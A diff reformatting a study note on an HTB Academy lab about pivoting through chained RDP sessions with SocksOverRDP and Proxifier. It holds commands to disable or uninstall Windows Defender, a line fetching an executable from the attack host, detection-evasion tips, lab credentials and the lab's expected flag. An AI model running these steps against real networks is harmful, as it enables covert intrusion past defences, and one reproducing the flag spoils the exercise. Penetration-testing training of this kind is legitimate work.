@@ -1,31 +1,34 @@
-# **RDP and SOCKS Tunneling with SocksOverRDP - HTB Academy Page 15**
+# 🔌 SocksOverRDP
 
 ## **📋 Module Overview**
 
-**Purpose:** SOCKS tunneling through RDP Dynamic Virtual Channels (DVC)  
-**Tool:** SocksOverRDP + Proxifier - Windows-specific pivoting solution  
-**Protocol:** RDP with custom DLL injection  
-**Advantage:** Works in Windows-only environments, bypasses SSH restrictions  
-**Use Case:** Windows network pivoting, RDP session chaining, internal access  
+**Purpose:** SOCKS tunneling through RDP Dynamic Virtual Channels (DVC)\
+**Tool:** SocksOverRDP + Proxifier - Windows-specific pivoting solution\
+**Protocol:** RDP with custom DLL injection\
+**Advantage:** Works in Windows-only environments, bypasses SSH restrictions\
+**Use Case:** Windows network pivoting, RDP session chaining, internal access
 
----
+***
 
 ## **1. Introduction to SocksOverRDP**
 
 ### **What is SocksOverRDP?**
-- **Purpose:** Tunnels arbitrary packets over RDP connections
-- **Mechanism:** Uses Dynamic Virtual Channels (DVC) from Remote Desktop Service
-- **Components:** DLL plugin + Server executable + Proxy client
-- **Platform:** Windows-specific solution for network pivoting
-- **Stealth:** Leverages legitimate RDP features for covert tunneling
+
+* **Purpose:** Tunnels arbitrary packets over RDP connections
+* **Mechanism:** Uses Dynamic Virtual Channels (DVC) from Remote Desktop Service
+* **Components:** DLL plugin + Server executable + Proxy client
+* **Platform:** Windows-specific solution for network pivoting
+* **Stealth:** Leverages legitimate RDP features for covert tunneling
 
 ### **Dynamic Virtual Channels (DVC)**
-- **Feature:** Built-in RDP capability for packet tunneling
-- **Legitimate Uses:** Clipboard data transfer, audio sharing, file transfer
-- **Abuse:** Tunnel custom packets over established RDP connections
-- **Advantage:** Uses existing RDP infrastructure, difficult to detect
+
+* **Feature:** Built-in RDP capability for packet tunneling
+* **Legitimate Uses:** Clipboard data transfer, audio sharing, file transfer
+* **Abuse:** Tunnel custom packets over established RDP connections
+* **Advantage:** Uses existing RDP infrastructure, difficult to detect
 
 ### **How SocksOverRDP Works**
+
 ```
 [Attack Host] → [RDP Session] → [Internal Target] → [Final Destination]
    xfreerdp     SocksOverRDP      DVC Tunnel        Target Service
@@ -35,27 +38,29 @@
 
 ### **SocksOverRDP vs Other Windows Pivoting**
 
-| **Aspect** | **SocksOverRDP** | **SSH Tunnel** | **Netsh** | **PowerShell** |
-|------------|------------------|----------------|-----------|----------------|
-| **Platform** | Windows Only | Cross-platform | Windows | Windows |
-| **Requirements** | RDP Access | SSH Client | Admin Rights | PowerShell |
-| **Stealth** | High | Low | Medium | Medium |
-| **Setup Complexity** | Medium | Low | Low | High |
-| **Performance** | Medium | High | High | Low |
-| **Detection** | Hard | Easy | Medium | Medium |
+| **Aspect**           | **SocksOverRDP** | **SSH Tunnel** | **Netsh**    | **PowerShell** |
+| -------------------- | ---------------- | -------------- | ------------ | -------------- |
+| **Platform**         | Windows Only     | Cross-platform | Windows      | Windows        |
+| **Requirements**     | RDP Access       | SSH Client     | Admin Rights | PowerShell     |
+| **Stealth**          | High             | Low            | Medium       | Medium         |
+| **Setup Complexity** | Medium           | Low            | Low          | High           |
+| **Performance**      | Medium           | High           | High         | Low            |
+| **Detection**        | Hard             | Easy           | Medium       | Medium         |
 
----
+***
 
 ## **2. Tool Requirements and Setup**
 
 ### **Required Components**
 
 #### **SocksOverRDP Components**
+
 1. **SocksOverRDP-Plugin.dll** - Client-side DLL for RDP session
 2. **SocksOverRDP-Server.exe** - Server-side executable for target
 3. **Proxifier** - Proxy client for traffic routing
 
 #### **Download URLs**
+
 ```bash
 # SocksOverRDP binaries
 wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
@@ -67,6 +72,7 @@ wget https://www.proxifier.com/download/ProxifierPE.zip
 ### **File Preparation**
 
 #### **Download and Extract**
+
 ```bash
 # On Pwnbox/Attack Host
 wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
@@ -86,6 +92,7 @@ ls -la "Proxifier PE"/
 ```
 
 #### **File Transfer Methods**
+
 ```bash
 # Method 1: Direct copy-paste in RDP session
 # - Copy files from host filesystem
@@ -101,11 +108,12 @@ impacket-smbserver share . -smb2support
 # On Windows: copy \\IP\share\file.exe .
 ```
 
----
+***
 
 ## **3. Architecture Overview**
 
 ### **Network Topology**
+
 ```
 [Pwnbox] → [Windows Pivot] → [Domain Controller] → [Final Target]
 10.10.14.x   10.129.42.198     172.16.5.19        172.16.6.155
@@ -115,6 +123,7 @@ xfreerdp     SocksOverRDP      SocksOverRDP       Final RDP
 ```
 
 ### **Traffic Flow**
+
 ```
 1. [Proxifier] → SOCKS proxy → 127.0.0.1:1080
 2. [Plugin.dll] → DVC tunnel → RDP connection
@@ -123,16 +132,18 @@ xfreerdp     SocksOverRDP      SocksOverRDP       Final RDP
 ```
 
 ### **Component Interaction**
-- **Proxifier:** Routes application traffic to SOCKS proxy
-- **Plugin.dll:** Intercepts SOCKS traffic, tunnels via DVC
-- **RDP Session:** Carries DVC tunnel data
-- **Server.exe:** Receives DVC data, forwards to target services
 
----
+* **Proxifier:** Routes application traffic to SOCKS proxy
+* **Plugin.dll:** Intercepts SOCKS traffic, tunnels via DVC
+* **RDP Session:** Carries DVC tunnel data
+* **Server.exe:** Receives DVC data, forwards to target services
+
+***
 
 ## **4. Implementation Steps**
 
 ### **Step 1: Prepare Attack Host**
+
 ```bash
 # Download required tools
 wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
@@ -147,6 +158,7 @@ file SocksOverRDP-Plugin.dll SocksOverRDP-Server.exe
 ```
 
 ### **Step 2: Connect to Windows Pivot Host**
+
 ```bash
 # RDP to initial Windows target
 xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
@@ -156,6 +168,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 ### **Step 3: Disable Windows Defender**
+
 ```powershell
 # In Windows pivot host - disable Defender (CRITICAL)
 # GUI Method:
@@ -171,6 +184,7 @@ Set-MpPreference -DisableBehaviorMonitoring $true
 ```
 
 ### **Step 4: Transfer Files to Pivot Host**
+
 ```powershell
 # Method 1: Copy-paste (easiest)
 # - Copy SocksOverRDP-Plugin.dll from host
@@ -184,6 +198,7 @@ Invoke-WebRequest -Uri "http://10.10.14.x:8000/SocksOverRDP-Server.exe" -OutFile
 ```
 
 ### **Step 5: Register SocksOverRDP Plugin**
+
 ```powershell
 # Run as Administrator (REQUIRED)
 # Open PowerShell as Administrator
@@ -197,11 +212,12 @@ regsvr32.exe SocksOverRDP-Plugin.dll
 # "DllRegisterServer in SocksOverRDP-Plugin.dll succeeded."
 ```
 
----
+***
 
 ## **5. Establishing RDP Tunnel Chain**
 
 ### **Step 6: RDP to Domain Controller**
+
 ```powershell
 # From Windows pivot host, connect to DC
 mstsc.exe
@@ -216,6 +232,7 @@ mstsc.exe
 ```
 
 ### **Step 7: Transfer Server to DC**
+
 ```powershell
 # On Domain Controller (172.16.5.19)
 # First disable Windows Defender
@@ -231,6 +248,7 @@ Uninstall-WindowsFeature -Name Windows-Defender
 ```
 
 ### **Step 8: Start SocksOverRDP Server**
+
 ```powershell
 # On Domain Controller - run as Administrator
 cd C:\Users\victor\Desktop
@@ -243,6 +261,7 @@ cd C:\Users\victor\Desktop
 ```
 
 ### **Step 9: Verify SOCKS Listener**
+
 ```powershell
 # Back on Windows pivot host - verify listener
 netstat -antb | findstr 1080
@@ -251,11 +270,12 @@ netstat -antb | findstr 1080
 # TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
 ```
 
----
+***
 
 ## **6. Proxifier Configuration**
 
 ### **Step 10: Launch Proxifier**
+
 ```powershell
 # On Windows pivot host - run as Administrator
 cd "C:\Users\htb-student\Desktop\Proxifier PE"
@@ -265,6 +285,7 @@ cd "C:\Users\htb-student\Desktop\Proxifier PE"
 ```
 
 ### **Step 11: Configure SOCKS Proxy**
+
 ```
 # In Proxifier GUI:
 1. Profile → Proxy Servers...
@@ -278,6 +299,7 @@ cd "C:\Users\htb-student\Desktop\Proxifier PE"
 ```
 
 ### **Step 12: Configure Proxification Rules**
+
 ```
 # In Proxifier GUI:
 1. Profile → Proxification Rules...
@@ -286,23 +308,26 @@ cd "C:\Users\htb-student\Desktop\Proxifier PE"
 4. Click OK to apply
 ```
 
----
+***
 
 ## **7. HTB Academy Lab Exercise**
 
 ### **Lab Challenge**
+
 **"Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop."**
 
 ### **Lab Environment**
-- **Initial Target:** 10.129.42.198 (htb-student:HTB_@cademy_stdnt!)
-- **Domain Controller:** 172.16.5.19 (victor:pass@123)
-- **Final Target:** 172.16.6.155 (jason:WellConnected123!)
-- **Flag Location:** Flag.txt on Jason's Desktop
-- **Expected Flag:** `H0pping@roundwithRDP!`
+
+* **Initial Target:** 10.129.42.198 (htb-student:HTB\_@cademy\_stdnt!)
+* **Domain Controller:** 172.16.5.19 (victor:pass@123)
+* **Final Target:** 172.16.6.155 (jason:WellConnected123!)
+* **Flag Location:** Flag.txt on Jason's Desktop
+* **Expected Flag:** `H0pping@roundwithRDP!`
 
 ### **Complete Lab Solution**
 
 #### **Phase 1: Setup and Initial Connection**
+
 ```bash
 # 1. Download tools on Pwnbox
 wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
@@ -316,6 +341,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 #### **Phase 2: Pivot Host Configuration**
+
 ```powershell
 # 3. Disable Windows Defender (GUI method)
 # Windows Security → Virus & threat protection → Manage settings
@@ -332,6 +358,7 @@ regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 
 #### **Phase 3: Domain Controller Connection**
+
 ```powershell
 # 6. RDP to Domain Controller
 mstsc.exe
@@ -354,6 +381,7 @@ cd C:\Users\victor\Desktop
 ```
 
 #### **Phase 4: Proxifier Setup**
+
 ```powershell
 # 10. Back on pivot host - verify SOCKS listener
 netstat -antb | findstr 1080
@@ -372,6 +400,7 @@ cd "C:\Users\htb-student\Desktop\Proxifier PE"
 ```
 
 #### **Phase 5: Final Target Access**
+
 ```powershell
 # 14. RDP to final target through proxy
 mstsc.exe
@@ -387,6 +416,7 @@ mstsc.exe
 ```
 
 #### **Lab Solution Summary**
+
 ```bash
 # Complete command sequence:
 # Pwnbox:
@@ -411,11 +441,12 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 # type Desktop\Flag.txt → H0pping@roundwithRDP!
 ```
 
----
+***
 
 ## **8. Troubleshooting Common Issues**
 
 ### **DLL Registration Failures**
+
 ```powershell
 # Problem: regsvr32.exe fails
 # Error: "The module 'SocksOverRDP-Plugin.dll' failed to load"
@@ -437,6 +468,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 ### **RDP Connection Issues**
+
 ```powershell
 # Problem: Cannot connect to internal targets
 # Error: "Remote Desktop can't connect to the remote computer"
@@ -460,6 +492,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 ### **SOCKS Proxy Issues**
+
 ```powershell
 # Problem: SOCKS listener not starting
 # netstat shows no 127.0.0.1:1080 listener
@@ -484,6 +517,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 ### **Proxifier Configuration Issues**
+
 ```powershell
 # Problem: Proxifier not routing traffic
 # Applications bypass proxy
@@ -507,6 +541,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 ### **Windows Defender Interference**
+
 ```powershell
 # Problem: Files get deleted automatically
 # Defender quarantines SocksOverRDP files
@@ -529,11 +564,12 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
    Uninstall-WindowsFeature -Name Windows-Defender
 ```
 
----
+***
 
 ## **9. Performance Optimization**
 
 ### **RDP Performance Settings**
+
 ```
 # In mstsc.exe → Experience tab:
 1. Connection speed: Modem (56 kbps)
@@ -547,6 +583,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 ### **Proxifier Performance**
+
 ```
 # In Proxifier:
 1. Profile → Advanced → Performance
@@ -556,6 +593,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 ### **Network Optimization**
+
 ```powershell
 # Reduce RDP bandwidth usage
 # In RDP session:
@@ -566,11 +604,12 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 5. Disable drive redirection
 ```
 
----
+***
 
 ## **10. Security Considerations**
 
 ### **OPSEC Implications**
+
 1. **Registry Modifications** - DLL registration leaves traces
 2. **Process Artifacts** - Proxifier and SocksOverRDP processes visible
 3. **Network Signatures** - DVC tunnel traffic patterns
@@ -578,6 +617,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 5. **Event Logs** - RDP connection logs, authentication events
 
 ### **Detection Evasion**
+
 ```powershell
 # Minimize detection footprint:
 1. Use legitimate RDP sessions
@@ -588,6 +628,7 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 ### **Cleanup Procedures**
+
 ```powershell
 # After completion:
 1. Unregister DLL
@@ -605,39 +646,42 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
    Set-MpPreference -DisableRealtimeMonitoring $false
 ```
 
----
+***
 
 ## **11. Alternative Windows Pivoting Methods**
 
 ### **Comparison with Other Techniques**
 
-| **Tool** | **Requirements** | **Stealth** | **Performance** | **Complexity** |
-|----------|------------------|-------------|-----------------|----------------|
-| **SocksOverRDP** | RDP Access | High | Medium | Medium |
-| **SSH Tunnel** | SSH Client | Low | High | Low |
-| **Netsh Portproxy** | Admin Rights | Medium | High | Low |
-| **PowerShell Remoting** | WinRM Enabled | Medium | Medium | High |
-| **Chisel** | Binary Transfer | High | High | Medium |
+| **Tool**                | **Requirements** | **Stealth** | **Performance** | **Complexity** |
+| ----------------------- | ---------------- | ----------- | --------------- | -------------- |
+| **SocksOverRDP**        | RDP Access       | High        | Medium          | Medium         |
+| **SSH Tunnel**          | SSH Client       | Low         | High            | Low            |
+| **Netsh Portproxy**     | Admin Rights     | Medium      | High            | Low            |
+| **PowerShell Remoting** | WinRM Enabled    | Medium      | Medium          | High           |
+| **Chisel**              | Binary Transfer  | High        | High            | Medium         |
 
 ### **When to Use SocksOverRDP**
-✅ **Windows-only environments**  
-✅ **RDP access available**  
-✅ **SSH/other tools blocked**  
-✅ **Need stealth tunneling**  
-✅ **Multiple RDP hops required**  
+
+✅ **Windows-only environments**\
+✅ **RDP access available**\
+✅ **SSH/other tools blocked**\
+✅ **Need stealth tunneling**\
+✅ **Multiple RDP hops required**
 
 ### **Limitations**
-❌ **Requires RDP access**  
-❌ **Windows Defender interference**  
-❌ **DLL registration traces**  
-❌ **Performance overhead**  
-❌ **Complex multi-step setup**  
 
----
+❌ **Requires RDP access**\
+❌ **Windows Defender interference**\
+❌ **DLL registration traces**\
+❌ **Performance overhead**\
+❌ **Complex multi-step setup**
+
+***
 
 ## **12. Integration with Other Tools**
 
 ### **Metasploit Integration**
+
 ```bash
 # Use SocksOverRDP with Metasploit
 # Configure proxy in msfconsole
@@ -650,6 +694,7 @@ exploit
 ```
 
 ### **Nmap Through RDP Tunnel**
+
 ```bash
 # Install Linux tools on Windows (WSL)
 # Or use PowerShell equivalents
@@ -660,6 +705,7 @@ Test-NetConnection 172.16.6.0/24 -Port 80,443,3389
 ```
 
 ### **Web Browser Pivoting**
+
 ```
 # Proxifier automatically routes browser traffic
 # Access internal web applications:
@@ -668,12 +714,12 @@ Test-NetConnection 172.16.6.0/24 -Port 80,443,3389
 # All traffic routes through RDP tunnel
 ```
 
----
+***
 
 ## **References**
 
-- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 15
-- **SocksOverRDP GitHub**: [Official Repository](https://github.com/nccgroup/SocksOverRDP)
-- **Proxifier**: [Official Website](https://www.proxifier.com/)
-- **RDP DVC Documentation**: [Microsoft Dynamic Virtual Channels](https://docs.microsoft.com/en-us/windows/win32/termserv/terminal-services-virtual-channels)
-- **Windows RDP Security**: [RDP Security Best Practices](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-allow-access) 
+* **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 15
+* **SocksOverRDP GitHub**: [Official Repository](https://github.com/nccgroup/SocksOverRDP)
+* **Proxifier**: [Official Website](https://www.proxifier.com/)
+* **RDP DVC Documentation**: [Microsoft Dynamic Virtual Channels](https://docs.microsoft.com/en-us/windows/win32/termserv/terminal-services-virtual-channels)
+* **Windows RDP Security**: [RDP Security Best Practices](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-allow-access)
